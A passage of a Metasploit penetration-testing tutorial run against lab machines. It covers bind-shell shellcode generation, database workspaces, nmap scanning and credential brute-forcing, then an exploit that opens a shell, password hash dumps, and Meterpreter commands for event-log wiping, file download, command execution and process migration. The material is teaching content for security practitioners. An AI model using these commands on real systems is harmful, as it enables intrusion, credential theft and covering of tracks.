 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 ...snip...

::

  msf  payload(shell_bind_tcp) > generate -t c
 /*
  * windows/shell_bind_tcp - 341 bytes
  * http://www.metasploit.com
  * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
  * InitialAutoRunScript=, AutoRunScript=
  */
 unsigned char buf[] =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
 "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
 "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
 ...snip...


::

  msf  payload(shell_bind_tcp) > generate -t java
 /*
  * windows/shell_bind_tcp - 341 bytes
  * http://www.metasploit.com
  * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
  * InitialAutoRunScript=, AutoRunScript=
  */
 byte shell[] = new byte[]
 {
	 (byte) 0xfc, (byte) 0xe8, (byte) 0x89, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x60, (byte) 0x89,
	 (byte) 0xe5, (byte) 0x31, (byte) 0xd2, (byte) 0x64, (byte) 0x8b, (byte) 0x52, (byte) 0x30, (byte) 0x8b,
	 (byte) 0x52, (byte) 0x0c, (byte) 0x8b, (byte) 0x52, (byte) 0x14, (byte) 0x8b, (byte) 0x72, (byte) 0x28,
	 (byte) 0x0f, (byte) 0xb7, (byte) 0x4a, (byte) 0x26, (byte) 0x31, (byte) 0xff, (byte) 0x31, (byte) 0xc0,
	 (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0xc1,
 ...snip...


Looking at the output for the different programming languages, we see that each output adheres to their respective language syntax. A hash ‘#’ is used for comments in Ruby but in C it’s replaced with the slash and asterisk characters ‘/*’ syntax. Looking at all three outputs, the arrays are properly declared for the language format selected. Making it ready to be copy & pasted into your script.

Adding a NOP (No Operation or Next Operation) sled is accomplished with the ‘-s‘ switch followed by the number of NOPs. This will add the sled at the beginning of our payload. Keep in mind the larger the sled the larger the shellcode will be. So adding a 10 NOPs will add 10 bytes to the total size.

::

  msf  payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 ...snip...

::

  msf  payload(shell_bind_tcp) > generate -s 14
 # windows/shell_bind_tcp - 355 bytes
 # http://www.metasploit.com
 # NOP gen: x86/opty2
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xb9\xd5\x15\x9f\x90\x04\xf8\x96\x24\x34\x1c\x98\x14\x4a" +
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 ...snip...

The first line of the buf of the second payload text shows us our NOP sled at the payload’s beginning. Comparing the next 3 lines with the shellcode just above, we see they are exactly the same. Total bytes, as expected, grew by exactly 14 bytes.

Metasploit database
^^^^^^^^^^^^

Setup
""""""

In Kali, you will need to start up the postgresql server before using the database.

::

  root@kali:~# systemctl start postgresql


After starting postgresql you need to create and initialize the msf database with msfdb init

::

  root@kali:~# msfdb init
 Creating database user 'msf'
 Enter password for new role:
 Enter it again:
 Creating databases 'msf' and 'msf_test'
 Creating configuration file in /usr/share/metasploit-framework/config/database.yml
 Creating initial database schema


Using Workspaces in Metasploit
""""""""

When we load up msfconsole, and run ‘db_status‘, we can confirm that Metasploit is successfully connected to the database.

::

  msf > db_status
 [*] postgresql connected to msf


Seeing this capability is a meant to keep track of our activities and scans in order. It’s imperative we start off on the right foot. Once connected to the database, we can start organizing our different movements by using what are called ‘workspaces’. This gives us the ability to save different scans from different locations/networks/subnets for example.

Issuing the ‘workspace‘ command from the msfconsole, will display the currently selected workspaces. The ‘default‘ workspace is selected when connecting to the database, which is represented by the * beside its name.

::

  msf > workspace
 * default
   msfu
   lab1
   lab2
   lab3
   lab4
 msf >


As we can see this can be quite handy when it comes to keeping things ‘neat’. Let’s change the current workspace to ‘msfu’.

::

  msf > workspace msfu
 [*] Workspace: msfu
 msf > workspace
   default
 * msfu
   lab1
   lab2
   lab3
   lab4
 msf >


Creating and deleting a workspace one simply uses the ‘-a‘ or ‘-d‘ followed by the name at the msfconsole prompt.

::

  msf > workspace -a lab4
 [*] Added workspace: lab4
 msf >


 msf > workspace -d lab4
 [*] Deleted workspace: lab4
 msf > workspace


It’s that simple, using the same command and adding the ‘-h‘ switch will provide us with the command’s other capabilities.

::

  msf > workspace -h
 Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information

 msf >

From now on any scan or imports from 3rd party applications will be saved into this workspace.

Now that we are connected to our database and workspace setup, lets look at populating it with some data. First we’ll look at the different ‘db_’ commands available to use using the ‘help’ command from the msfconsole.

::

   msf > help
 ...snip...

 Database Backend Commands
 =========================

    Command           Description
    -------           -----------
    creds             List all credentials in the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces



Importing and Scanning
""""""""""""""""

There are several ways we can do this, from scanning a host or network directly from the console, or importing a file from an earlier scan. Let’s start by importing an nmap scan of the ‘metasploitable 2’ host. This is done using the ‘db_import‘ followed by the path to our file.

::

  msf >  db_import /root/msfu/nmapScan
 [*] Importing 'Nmap XML' data
 [*] Import: Parsing with 'Rex::Parser::NmapXMLStreamParser'
 [*] Importing host 172.16.194.172
 [*] Successfully imported /root/msfu/nmapScan
 msf > hosts

 Hosts
 =====

 address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------  ---------  -----  -------  ----  --------
 172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server

 msf >


Once completed we can confirm the import by issuing the ‘hosts’ command. This will display all the hosts stored in our current workspace. We can also scan a host directly from the console using the ‘db_nmap’ command. Scan results will be saved in our current database. The command works the same way as the command line version of ‘nmap’


::

  msf > db_nmap -A 172.16.194.134
 [*] Nmap: Starting Nmap 5.51SVN ( http://nmap.org ) at 2012-06-18 12:36 EDT
 [*] Nmap: Nmap scan report for 172.16.194.134
 [*] Nmap: Host is up (0.00031s latency).
 [*] Nmap: Not shown: 994 closed ports
 [*] Nmap: PORT     STATE SERVICE      VERSION
 [*] Nmap: 80/tcp   open  http         Apache httpd 2.2.17 ((Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4

 ...snip...

 [*] Nmap: HOP RTT     ADDRESS
 [*] Nmap: 1   0.31 ms 172.16.194.134
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
 msf >


 msf > hosts

 Hosts
 =====

 address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------            ---------  -----  -------  ----  --------
 172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server
 172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server

 msf >


Backing Up Our Data
""""""""""""""

Exporting our data outside the Metasploit environment is very simple. Using the ‘db_export‘ command all our gathered information can be saved in a XML file. This format can be easily used and manipulated later for reporting purposes. The command has 2 outputs, the ‘xml‘ format which will export all of the information currently stored in our active workspace, and the ‘pwdump‘ format which exports everything related to used/gathered credentials.

::

  msf >  db_export -h
 Usage:
    db_export -f  [-a] [filename]
    Format can be one of: xml, pwdump
 [-] No output file was specified

 msf > db_export -f xml /root/msfu/Exported.xml
 [*] Starting export of workspace msfu to /root/msfu/Exported.xml [ xml ]...
 [*]     >> Starting export of report
 [*]     >> Starting export of hosts
 [*]     >> Starting export of events
 [*]     >> Starting export of services
 [*]     >> Starting export of credentials
 [*]     >> Starting export of web sites
 [*]     >> Starting export of web pages
 [*]     >> Starting export of web forms
 [*]     >> Starting export of web vulns
 [*]     >> Finished export of report
 [*] Finished export of workspace msfu to /root/msfu/Exported.xml [ xml ]...


Using the Hosts Command
"""""""""""""""""""""""

Now that we can import and export information to and from our database, let us look at how we can use this information within the msfconsole. Many commands are available to search for specific information stored in our database. Hosts names, address, discovered services etc. We can even use the resulting data to populate module settings such as RHOSTS. We’ll look how this is done a bit later.

The ‘hosts‘ command was used earlier to confirm the presence of data in our database. Let’s look at the different options available and see how we use it to provide us with quick and useful information. Issuing the command with ‘-h’ will display the help menu.

::

  msf > hosts -h
 Usage: hosts [ options ] [addr1 addr2 ...]

 OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o          Send output to a file in csv format
  -O        Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

 Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags


We’ll start by asking the ‘hosts‘ command to display only the IP address and OS type using the ‘-c‘ switch.

::

  msf > hosts -c address,os_flavor

 Hosts
 =====

 address         os_flavor
 -------         ---------
 172.16.194.134  XP
 172.16.194.172  Ubuntu


Setting up Modules
"""""""""""""""""""

Another interesting feature available to us, is the ability to search all our entries for something specific. Imagine if we wished to find only the Linux based machines from our scan. For this we’d use the ‘-S‘ option. This option can be combined with our previous example and help fine tune our results.

::

  msf > hosts -c address,os_flavor -S Linux

 Hosts
 =====

 address         os_flavor
 -------         ---------
 172.16.194.172  Ubuntu

 msf >


Using the output of our previous example, we’ll feed that into the ‘tcp’ scan auxiliary module.

::

  msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string for capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


We can see by default, nothing is set in ‘RHOSTS‘, we’ll add the ‘-R‘ switch to the hosts command and run the module. Hopefully it will run and scan our target without any problems.

::

  msf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R

 Hosts
 =====

 address         os_flavor
 -------         ---------
 172.16.194.172  Ubuntu

 RHOSTS => 172.16.194.172

 msf  auxiliary(tcp) > run

 [*] 172.16.194.172:25 - TCP OPEN
 [*] 172.16.194.172:23 - TCP OPEN
 [*] 172.16.194.172:22 - TCP OPEN
 [*] 172.16.194.172:21 - TCP OPEN
 [*] 172.16.194.172:53 - TCP OPEN
 [*] 172.16.194.172:80 - TCP OPEN

 ...snip...

 [*] 172.16.194.172:5432 - TCP OPEN
 [*] 172.16.194.172:5900 - TCP OPEN
 [*] 172.16.194.172:6000 - TCP OPEN
 [*] 172.16.194.172:6667 - TCP OPEN
 [*] 172.16.194.172:6697 - TCP OPEN
 [*] 172.16.194.172:8009 - TCP OPEN
 [*] 172.16.194.172:8180 - TCP OPEN
 [*] 172.16.194.172:8787 - TCP OPEN
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed


Of course this also works if our results contain more than one address.

::

  msf  auxiliary(tcp) > hosts -R

 Hosts
 =====

 address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------            ---------  -----  -------  ----  --------
 172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server
 172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server

 RHOSTS => 172.16.194.134 172.16.194.172

 msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting                Required  Description
   ----         ---------------                --------  -----------
   CONCURRENCY  10                             yes       The number of concurrent ports to check per host
   FILTER                                      no        The filter string for capturing traffic
   INTERFACE                                   no        The name of the interface
   PCAPFILE                                    no        The name of the PCAP capture file to process
   PORTS        1-10000                        yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       172.16.194.134 172.16.194.172  yes       The target address range or CIDR identifier
   SNAPLEN      65535                          yes       The number of bytes to capture
   THREADS      1                              yes       The number of concurrent threads
   TIMEOUT      1000                           yes       The socket connect timeout in milliseconds


You can see how useful this may be if our database contained hundreds of entries. We could search for Windows machines only, then set the RHOSTS option for the smb_version auxiliary module very quickly. The set RHOSTS switch is available in almost all of the commands that interact with the database.


Services
"""""""""""""

Another way to search the database is by using the ‘services‘ command. Like the previous examples, we can extract very specific information with little effort.

::

 msf > services -h

 Usage: services [-h] [-u] [-a] [-r ] [-p >port1,port2>] [-s >name1,name2>] [-o ] [addr1 addr2 ...]

 -a,--add          Add the services instead of searching
 -d,--delete       Delete the services instead of searching
 -c <col1,col2>    Only show the given columns
 -h,--help         Show this help information
 -s <name1,name2>  Search for a list of service names
 -p <port1,port2>  Search for a list of ports
 -r      Only show [tcp|udp] services
 -u,--up           Only show services which are up
 -o          Send output to a file in csv format
 -R,--rhosts       Set RHOSTS from the results of the search
 -S,--search       Search string to filter by

 Available columns: created_at, info, name, port, proto, state, updated_at


Much in the same way as the hosts command, we can specify which fields to be displayed. Coupled with the ‘-S‘ switch, we can also search for a service containing a particular string.

::

  msf > services -c name,info 172.16.194.134

 Services
 ========

 host            name          info
 ----            ----          ----
 172.16.194.134  http          Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134  msrpc         Microsoft Windows RPC
 172.16.194.134  netbios-ssn
 172.16.194.134  http          Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134  microsoft-ds  Microsoft Windows XP microsoft-ds
 172.16.194.134  mysql


Here we are searching all hosts contained in our database with a service name containing the string ‘http’.

::

  msf > services -c name,info -S http

 Services
 ========

 host            name  info
 ----            ----  ----
 172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.172  http  Apache httpd 2.2.8 (Ubuntu) DAV/2
 172.16.194.172  http  Apache Tomcat/Coyote JSP engine 1.1

The combinations for searching are enormous. We can use specific ports, or port ranges. Full or partial service name when using the ‘-s’ or ‘-S’ switches. For all hosts or just a select few… The list goes on and on. Here are a few examples, but you may need to experiment with these features in order to get what you want and need out your searches.


::

  msf > services -c info,name -p 445

 Services
 ========

 host            info                                  name
 ----            ----                                  ----
 172.16.194.134  Microsoft Windows XP microsoft-ds     microsoft-ds
 172.16.194.172  Samba smbd 3.X workgroup: WORKGROUP   netbios-ssn


::

  msf > services -c port,proto,state -p 70-81
 Services
 ========
 host           port proto state
 ----           ---- ----- -----
 172.16.194.134 80   tcp   open
 172.16.194.172 75   tcp   closed
 172.16.194.172 71   tcp   closed
 172.16.194.172 72   tcp   closed
 172.16.194.172 73   tcp   closed
 172.16.194.172 74   tcp   closed
 172.16.194.172 70   tcp   closed
 172.16.194.172 76   tcp   closed
 172.16.194.172 77   tcp   closed
 172.16.194.172 78   tcp   closed
 172.16.194.172 79   tcp   closed
 172.16.194.172 80   tcp   open
 172.16.194.172 81   tcp  closed


::

  msf > services -s http -c port 172.16.194.134
 Services
 ========
 host           port
 ----           ----
 172.16.194.134 80
 172.16.194.134 443


::

  msf > services -S Unr
 Services
 ========
 host           port proto name state info
 ----           ---- ----- ---- ----- ----
 172.16.194.172 6667 tcp   irc  open  Unreal ircd
 172.16.194.172 6697 tcp   irc  open  Unreal ircd


CSV Export
"""""""""""""

Both the hosts and services commands give us a means of saving our query results into a file. The file format is a comma separated value, or CSV. Followed by the ‘-o’ with path and filename, the information that has been displayed on the screen at this point will now be saved to disk.


::

  msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv

 [*] Wrote services to /root/msfu/http.csv

 msf > hosts -S Linux -o /root/msfu/linux.csv
 [*] Wrote hosts to /root/msfu/linux.csv

 msf > cat /root/msfu/linux.csv
 [*] exec: cat /root/msfu/linux.csv

 address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
 "172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""

 msf > cat /root/msfu/http.csv
 [*] exec: cat /root/msfu/http.csv

 host,port
 "172.16.194.134","80"
 "172.16.194.134","443"


Creds
""""""""""

The ‘creds’ command is used to manage found and used credentials for targets in our database. Running this command without any options will display currently saved credentials.


::

  msf > creds

 Credentials
 ===========

 host  port  user  pass  type  active?
 ----  ----  ----  ----  ----  -------

 [*] Found 0 credentials.


As with ‘db_nmap‘ command, successful results relating to credentials will be automatically saved to our active workspace. Let’s run the auxiliary module ‘mysql_login‘ and see what happens when Metasploit scans our server.


::

  msf  auxiliary(mysql_login) > run

 [*] 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
 [*] 172.16.194.172:3306 MYSQL - [1/2] - Trying username:'root' with password:''
 [*] 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed


 msf  auxiliary(mysql_login) > creds

 Credentials
 ===========

 host            port  user  pass  type      active?
 ----            ----  ----  ----  ----      -------
 172.16.194.172  3306  root        password  true

 [*] Found 1 credential.
 msf  auxiliary(mysql_login) >


We can see the module was able to connect to our mysql server, and because of this Metasploit saved the credentials in our database automatically for future reference.

During post-exploitation of a host, gathering user credentials is an important activity in order to further penetrate a target network. As we gather sets of credentials, we can add them to our database with the ‘creds -a’ command.

::

  msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
 [*] Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto=tcp sname= type=password user=Administrator pass=7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active=true

 msf > creds

 Credentials
 ===========

 host            port  user           pass                                                                  type      active?
 ----            ----  ----           ----                                                                  ----      -------
 172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  password  true

 [*] Found 1 credential.


Loot
"""""""""""

Once you’ve compromised a system (or three), one of the objective may be to retrieve hash dumps. From either a Windows or *nix system. In the event of a successful hash dump, this information will be stored in our database. We can view this dumps using the ‘loot’ command. As with almost every command, adding the ‘-h’ switch will display a little more information.

::

  msf > loot -h
 Usage: loot
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by


Here’s an example of how one would populate the database with some ‘loot’.

::

  msf  exploit(usermap_script) > exploit

 [*] Started reverse double handler
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo 4uGPYOrars5OojdL;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: "4uGPYOrars5OojdL\r\n"
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:55138) at 2012-06-27 19:38:54 -0400

 ^Z
 Background session 1? [y/N]  y

 msf  exploit(usermap_script) > use post/linux/gather/hashdump
 msf  post(hashdump) > show options

 Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

 msf  post(hashdump) > sessions -l

 Active sessions
 ===============

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 (172.16.194.172)

 msf  post(hashdump) > run

 [+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
 [+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
 [+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
 [+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
 [+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 [+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
 [+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
 [+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
 [*] Post module execution completed



 msf  post(hashdump) > loot

 Loot
 ====

 host            service  type          name                   content     info                            path
 ----            -------  ----          ----                   -------     ----                            ----
 172.16.194.172           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
 172.16.194.172           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
 172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt


Meterpreter
^^^^^^^^^^

Since the Meterpreter provides a whole new environment, we will cover some of the basic Meterpreter commands to get you started and help familiarize you with this most powerful tool. Throughout this course, almost every available Meterpreter command is covered. For those that aren’t covered, experimentation is the key to successful learning.

help
^^^^

The ‘help‘ command, as may be expected, displays the Meterpreter help menu.

::

  meterpreter > help

 Core Commands
 =============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    channel       Displays information about active channels
 ...snip...


background
""""""""""

The ‘background‘ command will send the current Meterpreter session to the background and return you to the msf prompt. To get back to your Meterpreter session, just interact with it again.

::

  meterpreter > background
 msf exploit(ms08_067_netapi) > sessions -i 1
 [*] Starting interaction with 1...

 meterpreter >


cat
""""""""""""""

The ‘cat‘ command is identical to the command found on *nix systems. It displays the content of a file when it’s given as an argument.

::

  meterpreter > cat
 Usage: cat file

 Example usage:
 meterpreter > cat edit.txt
 What you talkin' about Willis

 meterpreter >

cd > pwd
"""""""""""

The ‘cd‘ > ‘pwd‘ commands are used to change and display current working directly on the target host.
The change directory “cd” works the same way as it does under DOS and \*nix systems.
By default, the current working folder is where the connection to your listener was initiated.

::

  meterpreter > pwd
 c:\
 meterpreter > cd c:\windows
 meterpreter > pwd
 c:\windows
 meterpreter >


clearev
""""""""""

The ‘clearev‘ command will clear the Application, System, and Security logs on a Windows system. There are no options or arguments.


::

  meterpreter > clearev
 [*] Wiping 97 records from Application...
 [*] Wiping 415 records from System...
 [*] Wiping 0 records from Security...
 meterpreter >

download
""""""""

The ‘download‘ command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.

::

  meterpreter > download c:\\boot.ini
 [*] downloading: c:\boot.ini -> c:\boot.ini
 [*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
 meterpreter >


edit
"""""""""

The ‘edit‘ command opens a file located on the target host.
It uses the ‘vim’ so all the editor’s commands are available.

::

  meterpreter > ls

 Listing: C:\Documents and Settings\Administrator\Desktop
 ========================================================

 Mode              Size    Type  Last modified              Name
 ----              ----    ----  -------------              ----
 .
 ...snip...
 .
 100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt

 meterpreter > edit edit.txt


execute
"""""

The ‘execute‘ command runs a command on the target.

::

  meterpreter > execute -f cmd.exe -i -H
 Process 38320 created.
 Channel 1 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 C:\WINDOWS\system32>

getuid
""""""""

Running ‘getuid‘ will display the user that the Meterpreter server is running as on the host.

::

  meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >


hashdump
""""""""

The ‘hashdump‘ post module will dump the contents of the SAM database.

::

  meterpreter > run post/windows/gather/hashdump

 [*] Obtaining the boot key...
 [*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
 [*] Obtaining the user list and keys...
 [*] Decrypting user keys...
 [*] Dumping password hashes...

 Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
 dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
 SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
 victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 meterpreter >


idletime
"""""""

Running ‘idletime‘ will display the number of seconds that the user at the remote machine has been idle.

::

  meterpreter > idletime
 User has been idle for: 5 hours 26 mins 35 secs
 meterpreter >


ipconfig
"""""""

The ‘ipconfig‘ command displays the network interfaces and addresses on the remote machine.

::

  meterpreter > ipconfig

 MS TCP Loopback interface
 Hardware MAC: 00:00:00:00:00:00
 IP Address  : 127.0.0.1
 Netmask     : 255.0.0.0

 AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
 Hardware MAC: 00:0c:29:10:f5:15
 IP Address  : 192.168.1.104
 Netmask     : 255.255.0.0

 meterpreter >


lpwd > lcd
""""""""""

The ‘lpwd‘ > ‘lcd‘ commands are used to display and change the local working directory respectively.
When receiving a Meterpreter shell, the local working directory is the location where one started the Metasploit console.

Changing the working directory will give your Meterpreter session access to files located in this folder.

::

  meterpreter > lpwd
 /root

 meterpreter > lcd MSFU
 meterpreter > lpwd
 /root/MSFU

 meterpreter > lcd /var/www
 meterpreter > lpwd
 /var/www
 meterpreter >


ls
"""

As in Linux, the ‘ls‘ command will list the files in the current remote directory.


::

  meterpreter > ls

 Listing: C:\Documents and Settings\victim
 =========================================

 Mode              Size     Type  Last modified                   Name
 ----              ----     ----  -------------                   ----
 40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
 40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
 100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
 40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
 ...snip...


migrate
""""""""

Using the ‘migrate‘ post module, you can migrate to another process on the victim.

::

  meterpreter > run post/windows/manage/migrate

 [*] Running module against V-MAC-XP
 [*] Current server process: svchost.exe (1076)
 [*] Migrating to explorer.exe...
 [*] Migrating into process ID 816
 [*] New server process: Explorer.EXE (816)
 meterpreter >


ps
""""

The ‘ps‘ command displays a list of running processes on the target.


::

  meterpreter > ps

 Process list
 ============

    PID   Name                  Path
    ---   ----                  ----
